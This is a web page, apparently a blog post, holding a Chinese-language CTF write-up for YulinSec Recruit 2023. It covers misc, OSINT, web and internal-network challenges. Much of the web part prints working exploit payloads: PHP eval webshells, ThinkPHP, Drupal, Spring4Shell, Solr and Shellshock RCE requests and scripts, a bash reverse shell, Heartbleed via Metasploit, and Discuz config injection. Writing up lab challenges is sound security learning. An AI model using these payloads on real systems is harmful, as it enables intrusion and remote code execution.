@@ -1,11 +1,450 @@
-doctype
-html(lang=config.language)
-  include ./partial/header-base.pug
-  body
-    include ./partial/header.pug
-    main
-      section.main-content !{ body }
-    include ./partial/footer.pug
-    script(src=url_for('scripts/dark.js'))
-    if is_post()
-      script(src=url_for('scripts/post.js'))
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title> | Narcherの小窝</title>
+    <meta name="author" content="Narcher Alter" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/narcher.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.org" />
+<script src="https://cdn.staticfile.org/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.org/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.org/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.org/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>NARCHERの小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;NARCHERの小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1></h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/10/31
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="YulinSec-Recruit-2023-WP"><a href="#YulinSec-Recruit-2023-WP" class="headerlink" title="YulinSec Recruit 2023 WP"></a>YulinSec Recruit 2023 WP</h1><p><em>作者：Narcher</em>	<em>时间：2023&#x2F;10&#x2F;18</em>	<em>分类：writeup</em></p>
+<span id="more"></span>
+
+<h4 id="Baby-†签到†"><a href="#Baby-†签到†" class="headerlink" title="[Baby]†签到†"></a>[Baby]†签到†</h4><p>密文：<img src="/2023/10/31/YulinSec-Recruit-2023-WP/wps1.jpg" alt="img" style="zoom:50%;"></p>
+<p>密码本：<img src="/2023/10/31/YulinSec-Recruit-2023-WP/wps2.png" alt="img" style="zoom:50%;"></p>
+<p>解码之后：<img src="/2023/10/31/YulinSec-Recruit-2023-WP/wps3.jpg" alt="img" style="zoom:50%;">，之后再将解码后的表按先一三后二四的顺序解读，即得明文：WELCOME TO THE CTF GAME！</p>
+<p>题目要求我们将Flag以YulinSec{}包裹，并在每个英文单词间加入单下划线，所有英文字母均为小写。</p>
+<p>处理一下得：YulinSec{welcome_to_the_ctf_game!}</p>
+<h4 id="Mid-马赛克星球"><a href="#Mid-马赛克星球" class="headerlink" title="[Mid-]马赛克星球"></a>[Mid-]马赛克星球</h4><p>这题我只做出了第一问，太菜了~~~呜呜~</p>
+<p>根据题目描述我们得知图片先会被马赛克覆盖，后被系统处理后丢尽回收站，因此我们需要按顺序进行。首先进行系统处理的恢复，具体这么做呢？先把图片下载下来康康。</p>
+<p>我们得到这个：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697604049314.png" alt="uTools_1697604049314" style="zoom:50%;">
+
+<p>（什么鬼东西啊！！！）</p>
+<p>既然是系统处理，嗯~ o(<em>￣▽￣</em>)o……，啥也想不起来，那我们就按老一套先一把梭试试，先放进binwalk里康康：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697604258904.png" alt="uTools_1697604258904" style="zoom:50%;">
+
+<p>发现藏得有东西，我们分离一下：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697604368653.png" alt="uTools_1697604368653" style="zoom:50%;">
+
+<p>得到加密马赛克的代码（个人猜测可能和第二问有关）。</p>
+<p>这一步操作结束了，并没有得到对第一问有用的信息，我们再去试试下一步经典操作：<strong>改图片宽高</strong>。</p>
+<p>直接上github上找个脚本，恢复一下图片的宽高：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697604743573.png" alt="uTools_1697604743573" style="zoom: 30%;">
+
+<p>由此我们得到了被打上马赛克的图片，并得到了Flag:</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697630664370.png" alt="uTools_1697630664370" style="zoom: 33%;">
+
+<h4 id="Easy-盒武器"><a href="#Easy-盒武器" class="headerlink" title="[Easy]盒武器"></a>[Easy]盒武器</h4><h5 id="你是？"><a href="#你是？" class="headerlink" title="你是？"></a>你是？</h5><p>我们下载第一张图片：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/pic1.png" alt="pic1" style="zoom:25%;">
+
+<p>放到google识图上看看，一眼武汉理工大学南湖校区的图书馆，但MD5之后交Flag发现不对，经询问铃兰小姐得知要交图书馆的名字，于是改成YulinSec{md5(武汉理工大学南湖校区心至楼)}。</p>
+<p><del>第二问很奇怪，一眼是武汉长江大桥，拍摄视角看起来像是在龟山公园附近，但我把附近的景点都梭哈了一遍也没成功……</del></p>
+<h5 id="你的名字是？"><a href="#你的名字是？" class="headerlink" title="你的名字是？"></a>你的名字是？</h5><p>第二问通过问出题人，发现是我<del>猪鼻</del>了，其实还是让题目描述误导了，题目描述举出的例子是人民公园，让我误以为是找公园名字了……</p>
+<p>位置确实是龟山公园没错，但景点应该写龟山风景区，于是改成YulinSec{md5(湖北省武汉市汉阳区龟山北路5号龟山风景区)}。</p>
+<h5 id="我怎么想不起来了-w"><a href="#我怎么想不起来了-w" class="headerlink" title="我怎么想不起来了&gt;w&lt;"></a>我怎么想不起来了&gt;w&lt;</h5><p>第三问的话看出题人QQ空间锁定好时间区间爆破就好了(貌似有更好的办法，但我还没找到)。</p>
+<h4 id="【Baby】babyurl"><a href="#【Baby】babyurl" class="headerlink" title="【Baby】babyurl"></a>【Baby】babyurl</h4><p>本题考查ssrf。</p>
+<p>这道题本来我是通过绕过localhost做的，后来才知道那是非预期，于是我又重新做了一遍。</p>
+<p>首先我们访问题目网页。如下：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697606127230.png" alt="uTools_1697606127230" style="zoom: 25%;">
+
+<p>查看一下源码：</p>
+<p><code>&lt;!-- if(isset($_GET[&#39;urls&#39;]))&#123;     $urls = $_GET[&#39;urls&#39;];     $url_host = parse_url($urls,PHP_URL_HOST);     curl_get($urls); &#125; --&gt;</code></p>
+<p>点击here得：<u>Please access through local host</u></p>
+<p>既然如此，看了源码再加上题目描述，我们就明白了这是一道ssrf bypass题，因此我们根据源码顺序构造url，GET传参urls,根据要求在头部添加<code>http://</code>,直接传127.0.0.1会被过滤：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697610157444.png" alt="uTools_1697610157444" style="zoom: 50%;">
+
+<p>因此我们根据题目描述中的格式构造传参<code>?urls=http://foo@127.0.0.1:80@google.com/flag.php</code>，得到flag。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697611609913.png" alt="uTools_1697611609913" style="zoom: 33%;">
+
+<p>原理就是利用parse_url与curl_get对url解析的不同方式来绕过。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/1-169761139004025.png" alt="img" style="zoom: 25%;">
+
+
+
+<h4 id="【Baby】babyphp"><a href="#【Baby】babyphp" class="headerlink" title="【Baby】babyphp"></a>【Baby】babyphp</h4><p>本题考查php的弱比较与强碰撞的绕过。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697611518408.png" alt="uTools_1697611518408" style="zoom:67%;">
+
+<p>首先，是对弱比较的绕过。让a!&#x3D;b，但sha1值要相等，我们利用数组绕过：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697612004780.png" alt="uTools_1697612004780" style="zoom: 50%;">
+
+<p>原理为sha1函数无法处理数组，如果传入的是数组，那么会返回NULL，使二者比较起来相等。</p>
+<p>再做第二问的强碰撞。</p>
+<p>由于是<code>===</code>，无法使用数组绕过，并且代码是执行我们输入的Yu，而不是直接输出Flag，我们可以使用fastcoll对一句话木马进行处理，使其eval执行我们的一句话木马，进而用蚁剑连接。工具的具体使用方法就请去百度学习吧，这里直接贴出payload:<code>?Yu=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DF%F1%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%BB%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%0E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00%C9%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98C%EE%E0%02%1C%23V%DD%C2%15%D5%F1iI%D9%21%1E%8E%F8%05&amp;lin=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DFq%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%3B%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%8E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00I%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98Cn%E1%02%1C%23V%DD%C2%15%D5%F1iI%D9%A1%1E%8E%F8%05</code></p>
+<p>先在网页中执行一下，然后直接用蚁剑。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697612714775.png" alt="uTools_1697612714775" style="zoom: 33%;">
+
+<p>根目录发现flag2：<code>YulinSec&#123;2b5e2408ee27c31493b3b4728a1afb85&#125;</code>。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697612753728.png" alt="uTools_1697612753728" style="zoom: 33%;">
+
+
+
+<h4 id="【Baby】babyunserialize"><a href="#【Baby】babyunserialize" class="headerlink" title="【Baby】babyunserialize"></a>【Baby】babyunserialize</h4><p>本题考查基本的php反序列化。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697612976943.png" alt="uTools_1697612976943" style="zoom:50%;">
+
+<p>下面我们先构造第一问的payload:</p>
+<p><code>&lt;?php</code><br><code>$auth = array(</code><br>    <code>&quot;username&quot; =&gt; &quot;YulinSec&quot;,</code><br>    <code>&quot;passwd&quot; =&gt; &quot;i_love_php_unserialize&quot;,</code><br><code>);</code><br><code>echo serialize($auth);</code><br><code>?&gt;</code></p>
+<p>输出：<code>a:2:&#123;s:8:&quot;username&quot;;s:8:&quot;YulinSec&quot;;s:6:&quot;passwd&quot;;s:22:&quot;i_love_php_unserialize&quot;;&#125;</code></p>
+<p>用Hackbar传参得flag1:</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697613356265.png" alt="uTools_1697613356265" style="zoom: 33%;">
+
+<p>接着我们构造第二问的payload:</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697615624485.png" alt="uTools_1697615624485" style="zoom:50%;">
+
+<p>这里需要提到两个知识点：<code>__construct()</code>魔术方法与php中的引用赋值（具体请自行百度）。</p>
+<p>我们将构造的<code>$a</code>的序列化中的空改为%00，payload为：<code>?data=O:5:&quot;Yulin&quot;:4:&#123;s:12:&quot;%00Yulin%00user1&quot;;i:20421610;s:12:&quot;%00Yulin%00user2&quot;;R:2;s:8:&quot;%00*%00pass1&quot;;i:116759636;s:8:&quot;%00*%00pass2&quot;;R:3;&#125;</code></p>
+<p>之后传入得flag2:</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697615789942.png" alt="uTools_1697615789942" style="zoom: 33%;">
+
+
+
+<h4 id="EASY-Script-Kiddie"><a href="#EASY-Script-Kiddie" class="headerlink" title="[EASY]Script Kiddie"></a>[EASY]Script Kiddie</h4><p>这题看题目要求，就知道是要学会当脚本小子。因此我们直接去网上找相应的exp即可。</p>
+<p>第一题：<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697616166584.png" alt="uTools_1697616166584" style="zoom: 33%;"></p>
+<p>有经验的话应该看一眼就知道这是典型的thinkphp的漏洞了，直接去网上搜，这里贴上我搜到的一篇博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45676913/article/details/105467321">攻防世界 ThinkPHP V5（漏洞解析及利用）-CSDN博客</a></p>
+<p>直接payload:<code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code>拿到flag。（注：<code>cat /flag</code>可换成其他命令进行执行）</p>
+<p>第二题：<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697617612064.png" alt="uTools_1697617612064" style="zoom: 33%;"></p>
+<p>继续去搜drupal的相关漏洞，挨个对比，发现是CVE-2018-7600，直接利用现成的payload:</p>
+<p><code>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</code><br><code>Host: 121.5.35.176:30003</code><br><code>Upgrade-Insecure-Requests: 1</code><br><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46</code><br><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</code><br><code>Referer: http://121.5.35.176:30003/</code><br><code>Accept-Encoding: gzip, deflate</code><br><code>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</code><br><code>Cookie: JSESSIONID=F52208D5FDBBB4330779120E1AD41487</code><br><code>Connection: close</code><br><code>Content-Type:application/x-www-form-urlencoded</code><br><code>Content-Length: 110</code></p>
+<p><code>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=cat /flag</code></p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697618973124.png" alt="uTools_1697618973124" style="zoom:50%;">
+
+<p>得到flag：<code>YulinSec&#123;svt9di2rrew26kysr3b3oipkobq40sao&#125;</code>。</p>
+<p>第三题：<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697619156967.png" alt="uTools_1697619156967" style="zoom: 33%;"></p>
+<p>继续去网上搜spring相关的漏洞，挨个对比，发现是CVE-2022-22965。之后便是按部就班的来。</p>
+<p>发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件：</p>
+<p><code>GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</code><br><code>Host: 121.5.35.176:30004</code><br><code>Accept-Encoding: gzip, deflate</code><br><code>Accept: */*</code><br><code>Accept-Language: en</code><br><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 	AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 		Safari/537.36</code><br><code>Connection: close</code><br><code>suffix: %&gt;//</code><br><code>c1: Runtime</code><br><code>c2: &lt;%</code><br><code>DNT: 1</code><br><code>Content-Length: 2</code></p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697628135527.png" alt="uTools_1697628135527" style="zoom: 50%;">
+
+<p>然后，访问刚才的 JSP webshell，并执行任意命令，得到flag：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697628192414.png" alt="uTools_1697628192414" style="zoom: 33%;">
+
+
+
+<h4 id="【Mid】MidBypass"><a href="#【Mid】MidBypass" class="headerlink" title="【Mid】MidBypass"></a>【Mid】MidBypass</h4><p>这道题应该是想教一下蚁剑的基本用法。</p>
+<p>首先根据hint中的后门提示，用蚁剑连接：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697628515690.png" alt="uTools_1697628515690" style="zoom:33%;">
+
+<p>之后点击即送flag1:<code>YulinSec&#123;1602bc263c2a236f7f4a38859abb8d02&#125;</code></p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697628551226.png" alt="uTools_1697628551226" style="zoom: 33%;">
+
+<p>第二问大概就是要学一下蚁剑的插件使用:</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697628989710.png" alt="uTools_1697628989710" style="zoom: 33%;">
+
+<p>之后直接在根目录下找到flag2:</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697628941834.png" alt="uTools_1697628941834" style="zoom: 50%;">
+
+
+
+<h4 id="【Mid】苕皮"><a href="#【Mid】苕皮" class="headerlink" title="【Mid】苕皮"></a>【Mid】苕皮</h4><p>本题我是通过非预期来做的，之后立马被修了，呜呜呜~~~</p>
+<p>之后也没时间做这个题了，大概把我非预期的思路讲一讲吧。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697629180108.png" alt="uTools_1697629180108" style="zoom: 50%;">
+
+<p>在我做非预期解的时候，没有对base的过滤，因此，在经过几下本地传参测试后发现，过滤器在读取<code>$shaopi</code>时会控制字符的数量，后来经查证，貌似必须输入3的倍数。于是我们可以利用base64编码后可以随便加减等号的特性进行绕过。payload为：<code>?filter=convert.base64-decode|&amp;shaopi=PChzaGFvcGkpPg</code></p>
+<h4 id="【Baby】RseaE-季末大酬宾"><a href="#【Baby】RseaE-季末大酬宾" class="headerlink" title="【Baby】RseaE(季末大酬宾)"></a>【Baby】RseaE(季末大酬宾)</h4><p>第一次做内网题，瘫~~~</p>
+<p>首先给linux配置上ssh的socks5代理具体方法详见此博客<code>http://t.csdnimg.cn/fYTE4</code>，之后便可直接在虚拟机上进行操作，无需将文件传输到服务器上。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697629853662.png" alt="uTools_1697629853662" style="zoom:50%;">
+
+<p>直接利用fscan扫描内网存活主机，得：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1695790148925.png" alt="uTools_1695790148925" style="zoom:50%;">
+
+<p><strong>CVE-2019-17558</strong>：先访问<code>http://10.0.20.121/solr/Yulin/config</code>,写份脚本修改<code>params.resource.loader.enabled</code>为true，至此一切准备就绪。脚本贴在下面：</p>
+<p><code>import requests</code><br><code>import json</code></p>
+<p><code>url = &quot;http://10.0.20.121/solr/Yulin/config&quot;</code><br><code>headers = &#123;</code><br>    <code>&quot;Content-Type&quot;: &quot;application/json&quot;,</code><br><code>&#125;</code><br><code>data = &#123;</code><br>  <code>&quot;update-queryresponsewriter&quot;: &#123;</code><br>    <code>&quot;startup&quot;: &quot;lazy&quot;,</code><br>    <code>&quot;name&quot;: &quot;velocity&quot;,</code><br>    <code>&quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</code><br>    <code>&quot;template.base.dir&quot;: &quot;&quot;,</code><br>    <code>&quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</code><br>    <code>&quot;params.resource.loader.enabled&quot;: &quot;true&quot;</code><br>  <code>&#125;</code><br><code>&#125;</code></p>
+<p><code>response = requests.post(url, headers=headers, data=json.dumps(data))</code></p>
+<p><code>print(response.status_code)</code><br><code>print(response.text)</code></p>
+<p>之后便可进行rce命令执行。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697630556387.png" alt="uTools_1697630556387" style="zoom:50%;">
+
+<p>命令执行的payload稍微改一下就能用了，至于脚本，写一个能发包的就行。如下：</p>
+<p><code>import requests</code></p>
+<p><code>url = &#39;http://10.0.20.121/solr/Yulin/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/flag%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&#39;</code></p>
+<p><code>response = requests.get(url)</code></p>
+<p><code>print(response.text)</code></p>
+<p><strong>CVE-2014-6271</strong>：这个比较简单，一个脚本就出来了：</p>
+<p><code>import requests</code><br><code>import json</code></p>
+<p><code>url = &quot;http://10.0.20.156/yulin.cgi&quot;</code><br><code>headers = &#123;</code><br>    <code>&quot;User-Agent&quot;: &quot;() &#123; :; &#125;; echo; /bin/cat /flag&quot;,</code><br><code>&#125;</code></p>
+<p><code>response = requests.post(url, headers=headers)</code></p>
+<p><code>print(response.status_code)</code><br><code>print(response.text)</code></p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697631450912.png" alt="uTools_1697631450912" style="zoom:50%;">
+
+<p>原理大概是该<code>Bash</code>使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令<code>ENV</code>中解析成函数后，<code>Bash</code>执行并未退出，而是继续解析并执行shell命令。</p>
+<p><strong>CVE-2019-0230</strong>：这个就麻烦许多（主要是没回显，需要将<code>webshell</code>打到<code>portmap</code>的监听端口上，之后在转发端口查看），在这里就讲一下大体思路吧，就不一步步来了<del>（太麻烦了）</del>，首先，先将<code>portmap</code>传到目标服务器，之后设置监听端口与转发端口：<code>./portmap -m 2 -p1 7003 -h2 10.0.20.111 -p2 7004</code>随后利用脚本将命令<code>bash -i &gt;&amp; /dev/tcp/10.0.20.111/7003 0&gt;&amp;1</code>执行以实现反弹shell的目的，之后在本地利用<code>proxychains</code>通过<code>nc</code>监听7004端口数据，发现shell成功反弹，执行<code>cat /flag</code>获取flag：<code>YulinSec&#123;Wo0!_s2_059_1s_s0_Danger0uS&#125;</code></p>
+<p><strong>CVE-2014-0160</strong>：这个就简单许多了，直接用msf框架里现成的攻击模块就行了。下面的操作便是根据博客<code>https://blog.csdn.net/weixin_39190897/article/details/106879383</code>中的步骤完成。</p>
+<p>先执行<code>msfconsole</code>运行msf框架：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697633314758.png" alt="uTools_1697633314758" style="zoom:50%;">
+
+<p>再使用<code>search heartbleed</code>查找攻击模块：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697633363312.png" alt="uTools_1697633363312" style="zoom:50%;">
+
+<p>之后执行命令<code>use auxiliary/scanner/ssl/openssl_heartbleed</code>选择第一个攻击模块：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697633412395.png" alt="uTools_1697633412395" style="zoom:50%;">
+
+<p>设置对应的主机、端口参数：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697633489103.png" alt="uTools_1697633489103" style="zoom:50%;">
+
+<p>最后运行<code>run</code>命令，可以看见靶机的64KB信息：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697636512603.png" alt="uTools_1697636512603" style="zoom:50%;">
+
+<p>信息中间藏着flag：<code>YulinSec&#123;Wo0!_My_heArt_1s_B133dinG&#125;</code></p>
+<h4 id="【Mid】链式反应"><a href="#【Mid】链式反应" class="headerlink" title="【Mid】链式反应"></a>【Mid】链式反应</h4><p>本题只做了第一问，还是太菜了，要多练……</p>
+<p><strong>求你先注册吧TAT &amp; 致命后台</strong>：进去之后发现是个论坛：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697635982289.png" alt="uTools_1697635982289" style="zoom:50%;">
+
+<p>先随便注册一个账号试试（注意：这时候先看看admin账号是否有人，发现已经存在，说明我们注册之后要拿到admin账号的密码）：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697636107919.png" alt="uTools_1697636107919" style="zoom:50%;">
+
+<p>注册之后发现有个系统提醒，点进来是admin账号的密码，因此我们可以利用这个来登录admin账号管理后台。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697636210666.png" alt="uTools_1697636210666" style="zoom:50%;">
+
+<p>登录之后要干什么呢？（你问我我也不知道，当然是google啦！！！）</p>
+<p>搜索<code>Discuz x3.4 getshell</code>，找到了一篇写的特别好的博客：<code>https://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/</code></p>
+<p>之后便是进入右上角的管理中心—站长—UCenter设置。</p>
+<p>1.进入后台<code>站长</code>-<code>UCenter设置</code>，修改UCenter通信密钥为<code>123456</code>并<code>记录下来，填入code.php</code>，修改UC_API&#x3D;<code>http://recruit.xxf.world:12088/uc_server&#39;);eval($_POST[sven]);//</code>，点击保存</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697637217747.png" alt="uTools_1697637217747" style="zoom:50%;">
+
+<p>2.用大佬的脚本生成code参数的值(注意：此时操作必须加速，如果当超时之后，传参会返回别的内容而不是1，此时code值需要重新生成)：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697637443438.png" alt="uTools_1697637443438" style="zoom:50%;">
+
+<p><code>&lt;?php  //code.php源代码，可直接使用</code><br><code>$uc_key=&quot;123456&quot;;//此处填写刚才UCenter设置的值</code><br><code>$time = time() + 720000;</code><br><code>$str = &quot;time=&quot;.$time.&quot;&amp;action=updateapps&quot;;</code><br><code>$code = authcode($str,&quot;ENCODE&quot;,$uc_key);</code><br><code>$code = str_replace(&#39;+&#39;,&#39;%2b&#39;,$code);</code><br><code>$code = str_replace(&#39;/&#39;,&#39;%2f&#39;,$code);</code><br><code>echo $code;</code></p>
+<p><code>function authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) &#123;</code><br>  <code>$ckey_length = 4;</code><br>  <code>$key = md5($key != &#39;&#39; ? $key : &#39;123456&#39;);</code><br>  <code>$keya = md5(substr($key, 0, 16));</code><br>  <code>$keyb = md5(substr($key, 16, 16));</code><br>  <code>$keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;;</code></p>
